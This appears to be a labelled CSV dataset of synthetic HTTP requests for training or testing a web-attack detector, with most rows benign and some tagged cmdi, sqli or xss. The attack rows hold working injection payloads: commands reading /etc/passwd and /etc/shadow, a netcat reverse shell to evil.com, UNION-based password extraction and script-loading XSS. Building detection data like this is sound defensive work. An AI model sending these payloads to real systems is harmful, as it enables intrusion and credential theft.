method,url,headers,body,label
PUT,/apps/47111/api/v1/items?filter=electronics&min=2579,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/79853/api/v1/items""}","{""username"": ""ubuntu"", ""title"": ""howto"", ""category"": ""food"", ""description"": ""kubernetes"", ""quantity"": ""320""}",benign
DELETE,/apps/app-17288/dashboard?sort=popularity&offset=223&page=34&ref=email,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/api/apps/39998/deploy""}",,benign
PUT,/docs/food-bag?sort=id%20verification%20process,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""username"": ""book"", ""name"": ""golang"", ""category"": ""journal"", ""title"": ""novel"", ""email"": ""biography""}",benign
POST,/apps/5357/api/v1/items?page=22&max=29371&q=onerror handling in python&lang=en,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/account/preferences"", ""x-forwarded-for"": ""10.117.93.189""}","{""description"": ""linux"", ""username"": ""ring""}",benign
PUT,/register?filter=dress&lang=de,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""category"": ""cafe"", ""title"": ""coffee"", ""price"": ""237"", ""description"": ""food"", ""name"": ""guide""}",benign
DELETE,/api/v1/users/20035/profile?lang=fr&min=4683,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/register""}",,benign
DELETE,/items/64365?limit=39,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""referer"": ""https://example.com/categories/electronics/products""}",,benign
PUT,/api/v2/orders/6450/items?offset=22,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""name"": ""journal"", ""description"": ""kubernetes"", ""search"": ""biography"", ""comment"": ""$(cat /etc/hosts)""}",cmdi
PUT,/login?q=shoes&brand=hp&category=toys,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""search"": ""tea"", ""description"": ""8.8.8.8; cat /proc/self/environ"", ""comment"": ""headphones""}",cmdi
POST,/admin/settings/security?page=33&format=csv&search=%7C%20id%3Buname%20-a,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.238.185.53""}","{""email"": ""novel"", ""category"": ""obrien"", ""quantity"": ""429"", ""description"": ""diner"", ""price"": ""419""}",cmdi
POST,/admin/settings/security?brand=lenovo&filter=whiskas,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""title"": ""dress"", ""description"": ""java"", ""price"": ""355"", ""username"": ""electronics""}",benign
PUT,/categories/electronics/products?offset=144,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/login""}","{""price"": ""31"", ""username"": ""project"", ""quantity"": ""410"", ""email"": ""docker"", ""title"": ""house""}",benign
POST,/apps/26503/api/v1/items?brand=hp&page=9&min=776,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""title"": ""guide"", ""price"": ""174"", ""quantity"": ""331"", ""email"": ""ubuntu""}",benign
DELETE,/api/v2/orders/42815/items?format=csv&limit=63&min=1378&input=`whoami`,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml""}",,cmdi
PUT,/api/v1/users/19140/profile?format=json&q=project,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""username"": ""magazine"", ""price"": ""187"", ""title"": ""cat""}",benign
GET,/apps/app-83381/dashboard?search=$(cat /etc/hosts),"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/apps/72258""}",,cmdi
DELETE,/account/preferences?q=flat&min=3184,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json""}",,benign
POST,/account/preferences?offset=303&format=xml&q=terraform&page=44,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""email"": ""java"", ""title"": ""camera"", ""category"": ""ubuntu"", ""value"": ""book"", ""username"": ""dog""}",benign
PUT,/apps/50063?ref=search&q=linux,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/admin/settings/security""}","{""title"": ""tutorial"", ""price"": ""193"", ""name"": ""smoothie"", ""category"": ""guide""}",benign
POST,/checkout/cart?ref=javascript tutorial for beginners,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""email"": ""linux"", ""value"": ""watch"", ""category"": ""kubernetes""}",benign
DELETE,/api/v1/users/54249/profile?search=;cat /etc/passwd,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,cmdi
PUT,/login,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.129.77.69""}","{""name"": ""coffee"", ""comment"": ""1' GROUP BY 1--"", ""search"": ""camera""}",sqli
POST,/dashboard/apps/71031/metrics?max=84015&category=sports,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""price"": ""500"", ""title"": ""linux""}",benign
DELETE,/items/25548?q=cat&category=clothing,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/apps/app-34064/dashboard?limit=22&offset=93,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*""}",,benign
GET,/admin/settings/security?input=| ls -la,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/register"", ""x-forwarded-for"": ""10.107.190.63""}",,cmdi
DELETE,/blog/2022/flat-laptop-golang?ref=search&filter=camera&max=30516&q=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/checkout/cart""}",,xss
POST,/docs/magazine-ring-bag?q=linux,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""quantity"": ""91"", ""description"": ""smoothie"", ""title"": ""pet""}",benign
POST,/items/25882?page=O%27Brien%27s%20cafe,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v2/orders/36240/items""}","{""name"": ""trousers"", ""description"": ""laptop"", ""category"": ""python""}",benign
GET,/api/v2/orders/78547/items?format=json&q=howto,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
DELETE,/categories/sports/products?max=62192&brand=whiskas&sort=rating&ref=email,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/apps/98147/api/v1/items""}",,benign
POST,/docs/terraform-burger-tutorial-ubuntu?search=127.0.0.1 & nc -e /bin/sh evil.com 4444,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""description"": ""shoes"", ""quantity"": ""220"", ""category"": ""ubuntu""}",cmdi
POST,/api/apps/67689/deploy?category=books&sort=rating,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""description"": ""project"", ""quantity"": ""374""}",benign
PUT,/account/preferences?lang=es,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""value"": ""journal"", ""title"": ""watch"", ""description"": ""smoothie""}",benign
POST,/apps/26792/api/v1/items?filter=house,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/register""}","{""value"": ""coffee"", ""username"": ""howto"", ""quantity"": ""330"", ""email"": ""dress""}",benign
PUT,/account/preferences?sort=price_desc&offset=235&format=csv&input=1' WAITFOR DELAY '0:0:5'--,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/docs/keyboard-dress-linux""}","{""quantity"": ""352"", ""email"": ""book"", ""name"": ""whiskas"", ""price"": ""5"", ""value"": ""biography""}",sqli
PUT,/blog/2026/java-flat?category=toys&limit=30,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""title"": ""bag"", ""email"": ""dress""}",benign
POST,/blog/2024/electronics-headphones?max=60316&brand=lg&page=9,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/docs/coffee-trousers""}","{""email"": ""golang"", ""category"": ""shirt"", ""username"": ""typescript"", ""title"": ""ansible""}",benign
POST,/account/preferences,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/10265""}","{""quantity"": ""455"", ""price"": ""36"", ""email"": ""headphones""}",benign
PUT,/admin/settings/security,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""value"": ""rust"", ""name"": ""CHAR(39)||CHAR(79)||CHAR(82)""}",sqli
POST,/search?search=` cat /etc/shadow `,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/register""}","{""price"": ""92"", ""title"": ""resume"", ""name"": ""trousers""}",cmdi
PUT,/api/v2/orders/1067/items?ref=cat food and treats,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/checkout/cart""}","{""email"": ""apartment"", ""description"": ""tutorial"", ""quantity"": ""152""}",benign
DELETE,/api/v2/orders/62697/items?offset=478&q=1%27%20AND%201%3DCONVERT%28int%2C%20%28SELECT%20TOP%201%20name%20FROM%20sysobjects%29%29--,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml""}",,sqli
POST,/blog/2026/cafe-cat?offset=189&sort=newest,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""title"": ""typescript"", ""email"": ""shoes""}",benign
DELETE,/api/v2/orders/99053/items?ref=search,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
PUT,/search?lang=exec chef meal prep service,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/blog/2023/house-shoes"", ""x-forwarded-for"": ""10.89.186.47""}","{""value"": ""biography"", ""title"": ""tea"", ""quantity"": ""427"", ""category"": ""tutorial"", ""email"": ""salad""}",benign
PUT,/account/preferences?filter=shirt&offset=86,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""quantity"": ""478"", ""category"": ""resume""}",benign
GET,/admin/settings/security?page=24&filter=resume&sort=newest&format=json,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""referer"": ""https://example.com/categories/sports/products""}",,benign
PUT,/docs/howto-linux-ubuntu-magazine?q=pizza&sort=price_desc&page=13&limit=bash scripting tutorial for beginners,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/apps/79123/deploy""}","{""name"": ""whiskas"", ""username"": ""howto"", ""value"": ""portfolio""}",benign
GET,/products/69330/reviews?ref=social,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json"", ""referer"": ""https://example.com/login""}",,benign
GET,/api/apps/80001/deploy?category=furniture,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/apps/30312""}",,benign
POST,/admin/settings/security,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""name"": ""flat"", ""search"": ""<script/src=//evil.com/xss.js>"", ""comment"": ""tea""}",xss
DELETE,/products/88565/reviews?min=4122&filter=dog&id=' OR '1'='1' --,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*""}",,sqli
POST,/apps/app-70486/dashboard?min=464&brand=acer&q=<a href=javascript:alert(1)>click me</a>,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""quantity"": ""143"", ""username"": ""resume"", ""title"": ""shoes"", ""name"": ""golang""}",xss
DELETE,/search?page=1&lang=fr,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json""}",,benign
GET,/products/53374/reviews?page=32&q=` cat /etc/shadow `,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/api/apps/37603/deploy"", ""x-forwarded-for"": ""10.76.125.74""}",,cmdi
GET,"/apps/app-66133/dashboard?max=83079&search=1' UNION SELECT null,null,username,password FROM users--","{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""x-forwarded-for"": ""10.65.208.192""}",,sqli
POST,/blog/2025/golang-javascript,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""comment"": ""tutorial"", ""name"": ""electronics"", ""description"": ""1' OR '1'='1"", ""search"": ""textbook""}",sqli
PUT,/login?format=csv&ref=whoami%20command%20line%20guide&page=47&offset=125,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""title"": ""apartment"", ""email"": ""novel"", ""quantity"": ""302"", ""value"": ""juice""}",benign
POST,/api/v1/users/23954/profile,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/admin/settings/security""}","{""name"": ""juice"", ""description"": ""villa"", ""username"": ""tutorial"", ""email"": ""ubuntu"", ""category"": ""salad""}",benign
PUT,/checkout/cart?limit=91&ref=homepage&sort=relevance&search=%0acat%20/etc/passwd,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/products/33240/reviews""}","{""quantity"": ""155"", ""title"": ""howto"", ""category"": ""juice"", ""email"": ""diner""}",cmdi
PUT,/search?lang=fr&ref=social&offset=411&input=vbscript%3Amsgbox%281%29,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""quantity"": ""201"", ""title"": ""burger"", ""category"": ""python"", ""name"": ""ring""}",xss
PUT,/api/v1/users/33745/profile?max=40520&filter=javascript&sort=popularity,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.140.233.73""}","{""description"": ""0x31272f2a"", ""comment"": ""camera"", ""value"": ""obrien""}",sqli
POST,/categories/furniture/products?page=10&filter=house&format=json,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""name"": ""docker"", ""value"": ""studio"", ""title"": ""juice"", ""category"": ""jacket"", ""price"": ""346""}",benign
POST,/blog/2022/typescript-ring?format=xml&sort=popularity&ref=email&min=1760,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/58942/api/v1/items""}","{""value"": ""kubernetes"", ""name"": ""smoothie"", ""description"": ""javascript"", ""quantity"": ""469""}",benign
GET,/apps/app-35831/dashboard?q=cat%20%2Fetc%2Fresolvconf%20documentation,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/dashboard/apps/67125/metrics""}",,benign
